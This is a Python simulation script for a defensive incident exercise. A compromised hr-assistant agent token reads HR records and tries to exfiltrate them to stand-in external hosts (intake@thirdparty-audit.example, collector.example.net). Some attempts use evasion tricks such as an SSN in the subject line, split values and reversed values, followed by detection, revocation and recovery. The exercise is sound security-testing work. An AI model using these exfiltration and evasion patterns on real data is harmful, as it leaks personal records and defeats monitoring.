"""Simulated incident: a compromised hr-assistant tries to exfiltrate HR data.

Plays out attack -> detection -> containment -> recovery against the real engine and
writes incident/timeline.json. The postmortem in docs/incident-postmortem.md is
written from this output.

    python -m incident.simulate
"""
from __future__ import annotations

import json
import time
from pathlib import Path

from warden import acme, detections
from warden.engine import Warden
from eval.harness import NOON

OUT = Path(__file__).parent / "timeline.json"
EVIL = "intake@thirdparty-audit.example"


def main():
    original_scopes = list(acme.AGENTS["hr-assistant"]["scopes"])
    w = Warden("v1")
    tl: list[dict] = []
    t_clock = NOON

    def note(kind, detail, **kw):
        tl.append({"t": round(t_clock - NOON, 1), "kind": kind, "detail": detail, **kw})

    def agent_token(user="carol", scope="hr:read_record docs:read comms:send_email tickets:create", device="laptop-1"):
        sub = w.idp.user_token(user, passkey=True, device_id=device)
        act = w.idp.agent_client_token("hr-assistant", acme.AGENTS["hr-assistant"]["secret"])
        return w.sts.exchange(subject_token=sub, actor_token=act, scope=scope)["access_token"]

    # 1. Normal work
    tok = agent_token()
    for i, u in enumerate(("alice", "bob")):
        t_clock = NOON + 60 * i
        w.handle(tok, "hr:read_record", {"user": u}, now=t_clock)
    note("baseline", "hr-assistant reads two HR records for carol and sends nothing external")

    # 2. Compromise: the agent token is used from a device carol has never used.
    stolen = agent_token(device="vps-185")
    t_attack = NOON + 3600
    t_clock = t_attack
    note("attack_start", "stolen delegated token used from an unknown device (vps-185)")
    stolen_reads = {}
    for i, u in enumerate(("alice", "bob", "dave", "erin", "frank", "grace")):
        t_clock = t_attack + 5 * i
        r = w.handle(stolen, "hr:read_record", {"user": u}, now=t_clock)
        if r.data:
            stolen_reads[u] = r.data
    note("attack", f"read {len(stolen_reads)} HR records (within the agent's scope and carol's rights)", records=len(stolen_reads))

    attempts = [
        ("plain email", "comms:send_email", {"to": EVIL, "subject": "hr", "body": json.dumps(stolen_reads["alice"])}),
        ("base64 http", "comms:http_post", {"url": "https://collector.example.net/in", "body": "x"}),
        ("ssn in subject", "comms:send_email", {"to": EVIL, "subject": stolen_reads["bob"]["ssn"], "body": "ref"}),
        ("split value", "comms:send_email", {"to": EVIL, "subject": "part1", "body": stolen_reads["dave"]["ssn"][:6]}),
        ("reversed value", "comms:send_email", {"to": EVIL, "subject": "p", "body": stolen_reads["erin"]["ssn"][::-1]}),
    ]
    results = []
    for i, (name, action, args) in enumerate(attempts):
        t_clock = t_attack + 40 + 4 * i
        r = w.handle(stolen, action, args, now=t_clock)
        results.append({"attempt": name, "decision": r.decision, "reason": r.reason})
        note("exfil_attempt", f"{name}: {r.decision} ({r.reason})")
    # more probing for permissions the agent does not have
    for i, a in enumerate(("finance:create_payment", "hr:delete_record", "hr:update_record", "tickets:delete")):
        t_clock = t_attack + 70 + 3 * i
        r = w.handle(stolen, a, {"user": "alice", "payee": "x", "amount": 1, "id": "T-100", "field": "salary", "value": 1}, now=t_clock)
        note("probe", f"{a}: {r.decision} ({r.reason})")

    # 3. Detection
    alerts = detections.evaluate(w.log)
    first_rule_times = {}
    for a in alerts:
        first_rule_times.setdefault(a["rule"], a)
    t_detect = t_attack + 90      # assumption: the rule job runs every 30s; first run after the last event
    t_clock = t_detect
    note("detection", "alerts raised: " + ", ".join(sorted({f"{a['rule']}({a['severity']})" for a in alerts})), alerts=len(alerts))

    # 4. Containment: revoke the agent (manager + passkey), then tighten policy.
    time.sleep(1.1)
    t_clock = t_detect + 120
    w.verifier.revocations.revoke_agent("hr-assistant")
    note("contain", "hr-assistant revoked by heidi (manager, passkey): all outstanding agent tokens invalid")
    t_clock += 5
    r = w.handle(stolen, "hr:read_record", {"user": "alice"}, now=t_clock)
    note("verify", f"stolen token after revocation: {r.status} {r.reason}", status=r.status)
    r2 = w.handle(tok, "hr:read_record", {"user": "alice"}, now=t_clock + 1)
    note("verify", f"legitimate token also revoked (expected, blunt): {r2.status} {r2.reason}", status=r2.status)

    acme.AGENTS["hr-assistant"]["scopes"] = [s for s in acme.AGENTS["hr-assistant"]["scopes"] if not s.startswith("comms:")]
    note("tighten", "removed comms:* from hr-assistant's maximum scopes; external send requires a new review")

    # 5. Recovery
    time.sleep(1.1)
    t_clock += 600
    fresh = agent_token(scope="hr:read_record docs:read comms:send_email")
    r = w.handle(fresh, "hr:read_record", {"user": "alice"}, now=t_clock)
    r_mail = w.handle(fresh, "comms:send_email", {"to": "heidi@acme.test", "subject": "s", "body": "b"}, now=t_clock + 1)
    note("recover", f"fresh delegated token: read {r.decision}; email {r_mail.decision} ({r_mail.reason})")

    external = [m for m in w.store.outbox if not m["to"].endswith("@acme.test")] if w.store.outbox else []
    summary = {
        "records_read_by_attacker": len(stolen_reads),
        "external_messages_delivered": len(external),
        "exfil_attempts": results,
        "alerts": [{k: a[k] for k in ("rule", "severity", "identity", "evidence")} for a in alerts],
        "seconds_attack_start_to_detection": t_detect - t_attack,
        "seconds_detection_to_containment": 120,
        "chain_intact": w.log.verify_chain(),
    }
    OUT.write_text(json.dumps({"timeline": tl, "summary": summary}, indent=2) + "\n")
    for e in tl:
        print(f"T+{e['t']:>7}s  {e['kind']:<13} {e['detail']}")
    acme.AGENTS["hr-assistant"]["scopes"] = original_scopes      # leave the registry as we found it
    return summary

if __name__ == "__main__":
    main()
